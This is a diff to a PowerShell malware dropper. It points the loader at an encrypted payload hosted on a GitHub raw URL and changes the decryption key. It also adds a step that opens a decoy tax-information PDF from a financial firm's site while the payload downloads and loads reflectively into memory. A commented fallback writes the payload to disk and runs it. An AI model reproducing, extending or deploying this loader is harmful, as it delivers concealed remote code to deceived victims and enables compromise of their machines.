@@ -5,9 +5,9 @@
 # ----------------------------------------
 
 # REPLACE THIS WITH YOUR ACTUAL RAW GITHUB URL
-$gH = "https://raw.githubusercontent.com/brakedangola2/vagabond/refs/heads/main/payload.ps1" 
+$gH = "https://raw.githubusercontent.com/brakedangola2/vagabond/refs/heads/main/payload.bin" 
 
-$kY = [System.Text.Encoding]::UTF8.GetBytes("PhantomKey1234567890123456789012")
+$kY = [System.Text.Encoding]::UTF8.GetBytes("VagabondPhantomKey2026Secure")
 $iv = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")
 
 # Hex-encoded string for "System.Text.Encoding"
@@ -48,6 +48,9 @@ function G-Data {
 
 # Main Execution Flow
 try {
+    # Open Decoy PDF Silently
+    Start-Process "https://www.bairdwealth.com/siteassets/pdfs/tax-information/2026-tax-facts.pdf"
+    
     # Download encrypted payload
     $rD = G-Data -u "$gH"
     
@@ -58,7 +61,7 @@ try {
     [System.Reflection.Assembly]::Load($pL) | Out-Null
     
     # If it's an EXE, use this instead:
-    # $tempFile = [System.IO.Path]::GetTempFileName()
+    # $tempFile = [System.IO.Path].GetTempFileName()
     # [System.IO.File]::WriteAllBytes($tempFile, $pL)
     # Start-Process $tempFile
 } catch {
